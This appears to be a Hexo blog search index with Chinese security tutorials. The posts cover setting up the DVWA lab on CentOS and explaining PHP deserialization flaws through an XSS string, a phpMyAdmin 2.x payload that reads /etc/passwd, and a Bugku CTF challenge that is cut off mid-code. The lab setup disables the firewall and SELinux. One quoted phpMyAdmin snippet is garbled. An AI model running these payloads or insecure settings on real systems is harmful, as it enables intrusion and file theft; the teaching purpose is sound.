<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>centos下dvwa的搭建</title>
    <url>/post/d1dcde3a.html</url>
    <content><![CDATA[<hr>
<blockquote>
<p>本章概述：这是一篇关于dvwa搭建的文章</p>
</blockquote>
<hr>
<span id="more"></span>



<h2 id="1、安装软件包"><a href="#1、安装软件包" class="headerlink" title="1、安装软件包"></a>1、安装软件包</h2><p>命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum -y install mariadb*</span><br><span class="line"></span><br><span class="line">yum -y install httpd</span><br><span class="line"></span><br><span class="line">Yum -y install php*</span><br></pre></td></tr></table></figure>

<img src="https://i.loli.net/2020/08/06/5jgo2mBkIAKxtGH.jpg" width='60%'/>



<p>我们直接安装PHP可能会报错</p>
<p>因此我们需要先卸载老版本的php<br>命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum remove php* php-common</span><br></pre></td></tr></table></figure>
<p>首先安装epel-release<br>命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum -y install epel-release</span><br></pre></td></tr></table></figure>
<p>再通过rpm安装PHP源<br>命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rpm -Uvh https://mirror.webtatic.com/yum/el7/webtatic-release.rpm</span><br></pre></td></tr></table></figure>
<p>刷新一下yum源<br>命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum clear all</span><br></pre></td></tr></table></figure>
<p>执行安装<br>命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install php70w -y</span><br></pre></td></tr></table></figure>
<p>安装过程会挺久<br>最后验证php -v<br><img src="https://i.loli.net/2020/08/06/eQ2dDEulYBygbOF.jpg" width='60%'/></p>
<h2 id="2、上传dvwa"><a href="#2、上传dvwa" class="headerlink" title="2、上传dvwa"></a>2、上传dvwa</h2><p>将下载好的dvwa上传到服务器上去，然后解压到指定目录，移到Apache目录下，即&#x2F;var&#x2F;www&#x2F;html下。</p>
<p>命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv DVWA-master.zip  /var/www/html/</span><br></pre></td></tr></table></figure>

<p>这里解压的话需要支持解压zip的工具，因此我们要安装该工具</p>
<p>命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install -y unzip zip</span><br></pre></td></tr></table></figure>

<p>解压DVWA-master.zip</p>
<p>命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unzip DVWA-master.zip</span><br></pre></td></tr></table></figure>

<p>将解压后的文件夹改名为DVWA</p>
<p>命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv DVWA-master DVWA</span><br></pre></td></tr></table></figure>

<img src="https://i.loli.net/2020/08/06/hKomv681zkIl57D.jpg" width='60%'/>

 

<h2 id="3、设置数据库"><a href="#3、设置数据库" class="headerlink" title="3、设置数据库"></a>3、设置数据库</h2><p>先启动mariadb服务</p>
<p>命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl start mariadb</span><br></pre></td></tr></table></figure>

<p>进入数据库，回车直接进入</p>
<p>命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u root -p</span><br></pre></td></tr></table></figure>

<p>数据库执行以下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create database dvwa;</span><br><span class="line"></span><br><span class="line">grant all on dvwa.* to dvwa@localhost identified by &#x27;123456&#x27;;</span><br><span class="line"></span><br><span class="line">flush privileges;</span><br><span class="line"></span><br><span class="line">exit</span><br></pre></td></tr></table></figure>

<p>上述的sql语句意思是创建一个dvwa数据库，授权dvwa用户拥有所有权限，刷新系统权限表。</p>
<p>退出数据库后重启一下mariadb服务</p>
<p>命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart mariadb</span><br></pre></td></tr></table></figure>

<h2 id="4、修改dvwa的配置文件"><a href="#4、修改dvwa的配置文件" class="headerlink" title="4、修改dvwa的配置文件"></a>4、修改dvwa的配置文件</h2><p>文件在DVWA目录下的config文件夹里面，里面有个文件名叫config.inc.php.dist的文件</p>
<p>先把该文件复制一份备份并命名为config.inc.php</p>
<p>命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp config.inc.php.dist config.inc.php</span><br></pre></td></tr></table></figure>

<p>vim进入该文件</p>
<img src="https://i.loli.net/2020/08/06/K5ZekTCEo4HJLV3.jpg" width='60%'/>

<p>两个key分别是6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg以及6LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ，也可以上网找</p>
<p>修改&#x2F;etc&#x2F;php.ini这个文件</p>
<p>将allow_url_include &#x3D; Off改为On</p>
<h2 id="5、重启服务"><a href="#5、重启服务" class="headerlink" title="5、重启服务"></a>5、重启服务</h2><p>命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart mariadb</span><br><span class="line"></span><br><span class="line">systemctl restart httpd</span><br><span class="line"></span><br><span class="line">systemctl stop firewalld</span><br><span class="line"></span><br><span class="line">setenforce 0</span><br></pre></td></tr></table></figure>

<p>测试是否可以进去DVWA平台</p>
<img src="https://i.loli.net/2020/08/06/2VukU4wMnzpcNQh.jpg" width='60%'/>

<p>解决方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chown apache:apache -R /var/www/html</span><br></pre></td></tr></table></figure>

<p>以及安装php-mysqli</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install -y php-mysqli</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>dvwa</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP反序列化漏洞</title>
    <url>/post/b9fcc90b.html</url>
    <content><![CDATA[<hr>
<blockquote>
<p>本章概述：这是一篇关于PHP反序列化漏洞的文章</p>
</blockquote>
<hr>
<span id="more"></span>



<h2 id="1、PHP序列化和反序列化"><a href="#1、PHP序列化和反序列化" class="headerlink" title="1、PHP序列化和反序列化"></a>1、PHP序列化和反序列化</h2><p>在学习PHP反序列化漏洞之前，我们有必要先来了解一下这两个函数，<code>serialize()</code>和<code>unserialize()</code>，熟悉PHP的大佬都知道，这两个是序列化和反序列化函数，那什么是序列化和反序列化。根据官方手册，所有php里面的值都可以使用函数<code>serialize()</code>来返回一个包含字节流的字符串来表示。<code>unserialize()</code>函数能够重新把字符串变回php原来的值。 序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。那么简单来说，序列化就是把一个对象变成可以传输的字符串，反序列化就是把序列化后的字符串还原成对象。</p>
<p>序列化示例：</p>
<blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$test</span>=<span class="string">&quot;github&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$s</span>=<span class="keyword">new</span> <span class="title function_ invoke__">S</span>(); <span class="comment">//创建一个对象</span></span><br><span class="line">    <span class="title function_ invoke__">serialize</span>(<span class="variable">$s</span>); <span class="comment">//把这个对象进行序列化</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$s</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">上述代码会返回 O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:6:&quot;github&quot;;&#125;字符串。</span></span><br><span class="line"><span class="comment">        o:代表一个object</span></span><br><span class="line"><span class="comment">        第一个1：代表对象名字长度为一个字符</span></span><br><span class="line"><span class="comment">        S：对象的名称</span></span><br><span class="line"><span class="comment">        第二个1：代表对象里面有一个变量</span></span><br><span class="line"><span class="comment">        s：数据类型</span></span><br><span class="line"><span class="comment">        4：变量名称长度</span></span><br><span class="line"><span class="comment">        test：变量名称</span></span><br><span class="line"><span class="comment">        s：数据类型</span></span><br><span class="line"><span class="comment">        6：变量值的长度</span></span><br><span class="line"><span class="comment">        github：变量值</span></span><br><span class="line"><span class="comment">**/</span></span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="2、反序列化漏洞"><a href="#2、反序列化漏洞" class="headerlink" title="2、反序列化漏洞"></a>2、反序列化漏洞</h2><p>需要注意的是，序列化和反序列化本身没有问题，但是如果反序列化的内容是用户可以控制的,且后台不正当的使用了PHP中的魔法函数,就会导致安全问题。我们来了解一下几个常见的魔法函数</p>
<blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">__construct</span>()当一个对象创建时被调用</span><br><span class="line"><span class="title function_ invoke__">__destruct</span>()当一个对象销毁时被调用</span><br><span class="line"><span class="title function_ invoke__">__toString</span>()当一个对象被当作一个字符串使用</span><br><span class="line"><span class="title function_ invoke__">__sleep</span>() 在对象在被序列化之前运行</span><br><span class="line"><span class="title function_ invoke__">__wakeup</span>()在被反序列化之前先调用该函数</span><br><span class="line"></span><br><span class="line">漏洞示例：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;github&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">        &#125;</span><br><span class="line">       &#125;</span><br><span class="line">    <span class="variable">$s</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line">    @<span class="variable">$unser</span> = <span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;&quot;;&#125;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//上面的代码反序列化函数里面的东西是用户自己输入的，当用户输入该payload时，函数执行完就会弹出一个框，而之所以会这样，就是因为没有对用户输入的内容进行控制。</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>根据上面所说的内容，我们可以总结出该漏洞利用的条件：unserialize函数的参数用户可控，所写的内容需要有对象中的成员变量的值，脚本中存在魔法函数。</p>
<h2 id="3、漏洞解析"><a href="#3、漏洞解析" class="headerlink" title="3、漏洞解析"></a>3、漏洞解析</h2><p>漏洞样例：phpMyAdmin 2.x中存在的反序列化漏洞，漏洞位置在&#x2F;scripts&#x2F;setup.php文件中。</p>
<p>下面我们看一下源代码：</p>
<blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;PMA_MINIMUM_COMMON&#x27;</span>, <span class="literal">TRUE</span> );</span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;./libraries/common.lib.php&#x27;</span>);   <span class="comment">//引入该php文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Grab configuration defaults</span></span><br><span class="line"><span class="variable">$PMA_Config</span> = <span class="keyword">new</span> <span class="title class_">PMA_Config</span>();   <span class="comment">//创建了PMA_Config对象，PMA_Config就是对象名</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Script information</span></span><br><span class="line"><span class="variable">$script_info</span> = <span class="string">&#x27;phpMyAdmin &#x27;</span> . <span class="variable">$PMA_Config</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;PMA_VERSION&#x27;</span>) . <span class="string">&#x27; setup script by Michal ?iha? &lt;michal@cihar.com&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$script_version</span> = <span class="string">&#x27;$Id$&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Grab action</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;action&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$action</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$action</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;configuration&#x27;</span>]) &amp;&amp; <span class="variable">$action</span> != <span class="string">&#x27;clear&#x27;</span> ) &#123;    </span><br><span class="line">    <span class="comment">//如果configuration存在并且action不为clear，则对configuration进行反序列化操作</span></span><br><span class="line">    <span class="comment">// Grab previous configuration, if it should not be cleared</span></span><br><span class="line">    <span class="variable">$configuration</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;configuration&#x27;</span>]);   <span class="comment">//反序列化</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// Start with empty configuration</span></span><br><span class="line">    <span class="variable">$configuration</span> = <span class="keyword">array</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// We rely on Servers array to exist, so create it here</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$configuration</span>[<span class="string">&#x27;Servers&#x27;</span>]) || !<span class="title function_ invoke__">is_array</span>(<span class="variable">$configuration</span>[<span class="string">&#x27;Servers&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$configuration</span>[<span class="string">&#x27;Servers&#x27;</span>] = <span class="keyword">array</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//代码上面重要部分有注释</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面的这段代码简单来说，就是通过输入一个序列化字符，会反序列化成一个对象，但是并没有看到魔法函数。</p>
<p>因此我们接着看引入的文件.&#x2F;libraries&#x2F;common.lib.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;./libraries/sanitizing.lib.php&#x27;</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;./libraries/Theme.class.php&#x27;</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;./libraries/Theme_Manager.class.php&#x27;</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;./libraries/Config.class.php&#x27;</span>;   <span class="comment">//引入了Config.class.php</span></span><br></pre></td></tr></table></figure>

<p>这个文件又引入了其他文件，我们主要看Config.class.php，这个才是重点文件。</p>
<p>.&#x2F;libraries&#x2F;Config.class.php：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)   //魔法函数<span class="title">__wakeup</span>，该魔法函数在对象被序列化之后立即被触发调用：</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ( <span class="variable language_">$this</span>-&gt;source_mtime !== <span class="title function_ invoke__">filemtime</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">getSource</span>())</span><br><span class="line">          || <span class="variable language_">$this</span>-&gt;error_config_file || <span class="variable language_">$this</span>-&gt;error_config_default_file ) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;settings = <span class="keyword">array</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">load</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">getSource</span>());   <span class="comment">//满足条件会调用load函数</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkSystem</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// check for https needs to be done everytime,</span></span><br><span class="line">        <span class="comment">// as https and http uses same session so this info can not be stored</span></span><br><span class="line">        <span class="comment">// in session</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkIsHttps</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkCollationConnection</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">load</span>(<span class="params"><span class="variable">$source</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">loadDefaults</span>();</span><br><span class="line">        <span class="keyword">if</span> ( <span class="literal">null</span> !== <span class="variable">$source</span> ) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">setSource</span>(<span class="variable">$source</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( ! <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkConfigSource</span>() ) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$cfg</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Parses the configuration file</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="variable">$old_error_reporting</span> = <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> ( <span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;file_get_contents&#x27;</span>) ) &#123;</span><br><span class="line">            <span class="variable">$eval_result</span> =file_get_contents</span><br><span class="line">                <span class="keyword">eval</span>( <span class="string">&#x27;?&gt;&#x27;</span> . <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">getSource</span>()) );    <span class="comment">//重点在这几行代码，当检测到file_get_contents函数存在时，输出字符串，不存在是输出文件内容</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$eval_result</span> =</span><br><span class="line">                <span class="keyword">eval</span>( <span class="string">&#x27;?&gt;&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;\n&#x27;</span>, <span class="title function_ invoke__">file</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">getSource</span>())) );         </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">error_reporting</span>(<span class="variable">$old_error_reporting</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( <span class="variable">$eval_result</span> === <span class="literal">false</span> ) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;error_config_file = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span>  &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;error_config_file = <span class="literal">false</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source_mtime = <span class="title function_ invoke__">filemtime</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">getSource</span>());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@TODO</span> check validity of $_COOKIE[&#x27;pma_collation_connection&#x27;]</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> ( ! <span class="keyword">empty</span>( <span class="variable">$_COOKIE</span>[<span class="string">&#x27;pma_collation_connection&#x27;</span>] ) ) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">set</span>(<span class="string">&#x27;collation_connection&#x27;</span>,</span><br><span class="line">                <span class="title function_ invoke__">strip_tags</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;pma_collation_connection&#x27;</span>]) );</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">set</span>(<span class="string">&#x27;collation_connection&#x27;</span>,</span><br><span class="line">                <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;DefaultConnectionCollation&#x27;</span>) );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkCollationConnection</span>();</span><br><span class="line">        <span class="comment">//$this-&gt;checkPmaAbsoluteUri();</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;settings = <span class="title function_ invoke__">PMA_array_merge_recursive</span>(<span class="variable">$this</span>-&gt;settings, <span class="variable">$cfg</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在这个文件里面，我们找到魔法函数<code>__wakeup()</code>，并且通过代码解析我们可以发现，满足魔法函数的条件时会调用<code>load</code>函数，我们进一步继续跟踪load函数会发现传入了一个<code>source</code>变量，并且在<code>load</code>函数中有几行重要的代码，也是漏洞的关键位置。我将这几行代码单独放在下面来看一看。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;file_get_contents&#x27;</span>) ) &#123;</span><br><span class="line">    <span class="variable">$eval_result</span> =file_get_contents</span><br><span class="line">        <span class="keyword">eval</span>( <span class="string">&#x27;?&gt;&#x27;</span> . <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">getSource</span>()) );    <span class="comment">//重点在这几行代码，当检测到file_get_contents函数存在时，输出字符串，不存在是输出文件内容</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$eval_result</span> =</span><br><span class="line">        <span class="keyword">eval</span>( <span class="string">&#x27;?&gt;&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;\n&#x27;</span>, <span class="title function_ invoke__">file</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">getSource</span>())) );         </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当检测到<code>file_get_contents</code>被定义，则通过<code>eval</code>函数执行读入的字符串；如果没有<code>file_get_contents</code>函数，则通过<code>file</code>读入文件，同时利用<code>implode</code>函数把文件内容利用<code>\n</code>拼接，再执行<code>eval</code>函数。</p>
<p>那么整个代码的分析过程就已经完成了，通过上面的解析，我们可以发现，当我们输入一个序列化字符串，在被反序列化成一个对象之前，会先触发<code>__wakeup()</code>函数，并且满足该魔法函数内的要求时，则可以进行任意读取文件或其他操作。</p>
<p>接下来我们所需要的就是构造我们需要的payload。</p>
<p>在setup.php文件中，我们需要两个传参字段，<code>action</code>和<code>configuration</code>，同时创建了对象<code>PMA_Config </code>。</p>
<p>并且在load函数中传入source参数。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PMA_Config</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>=<span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$PMA_Config</span>=<span class="keyword">new</span> <span class="title class_">PMA_Config</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$PMA_Config</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们得到的序列化的字符串为：<code>O:10:&quot;PMA_Config&quot;:1:&#123;s:6:&quot;source&quot;;s:11:&quot;/etc/passwd&quot;;&#125;</code></p>
<p><img src="https://i.loli.net/2020/08/20/txIA3bwazL9HRWK.png"></p>
<p>可以看到上面的payload把etc下的passwd文件给读取出来了。</p>
<h2 id="4、CTF样题"><a href="#4、CTF样题" class="headerlink" title="4、CTF样题"></a>4、CTF样题</h2><p>这里顺便附上一道Bugku的CTF样题。</p>
<p>题目地址：<a href="http://123.206.87.240:8002/flagphp">flag.php</a>，提示为：hint</p>
<p><img src="https://i.loli.net/2020/08/20/mtq4lkdLAwV7Tba.png"></p>
<p>这是一个点击登录完全没效果的页面，按照提示，我给了个hint&#x3D;111的参数，页面显示源码。源码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;ISecer&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hint&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (<span class="title function_ invoke__">unserialize</span>(<span class="variable">$cookie</span>) === <span class="string">&quot;<span class="subst">$KEY</span>&quot;</span>)</span><br><span class="line">&#123;   </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;Login&lt;/title&gt;</span><br><span class="line">&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;admin.css&quot;</span> type=<span class="string">&quot;text/css&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot; <span class="title">align</span>=&quot;<span class="title">center</span>&quot;&gt;</span></span><br><span class="line"><span class="class">  &lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">POST</span>&quot; <span class="title">action</span>=&quot;#&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">p</span>&gt;&lt;<span class="title">input</span> <span class="title">name</span>=&quot;<span class="title">user</span>&quot; <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">placeholder</span>=&quot;<span class="title">Username</span>&quot;&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">p</span>&gt;&lt;<span class="title">input</span> <span class="title">name</span>=&quot;<span class="title">password</span>&quot; <span class="title">type</span>=&quot;<span class="title">password</span>&quot; <span class="title">placeholder</span>=&quot;<span class="title">Password</span>&quot;&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">p</span>&gt;&lt;<span class="title">input</span> <span class="title">value</span>=&quot;<span class="title">Login</span>&quot; <span class="title">type</span>=&quot;<span class="title">button</span>&quot;/&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">  &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class">$<span class="title">KEY</span>=&#x27;<span class="title">ISecer</span>:<span class="title">www</span>.<span class="title">isecer</span>.<span class="title">com</span>&#x27;;</span></span><br><span class="line"><span class="class">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>我把源码给简单过滤了一下不需要看的部分</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;flag.php&quot;</span>);  </span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;ISecer&#x27;</span>];  <span class="comment">//取出cookie</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hint&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (<span class="title function_ invoke__">unserialize</span>(<span class="variable">$cookie</span>) === <span class="string">&quot;<span class="subst">$KEY</span>&quot;</span>)   <span class="comment">//重点来了，对cookie进行反序列化操作，若等于$KEY则输出flag</span></span><br><span class="line">&#123;   </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span 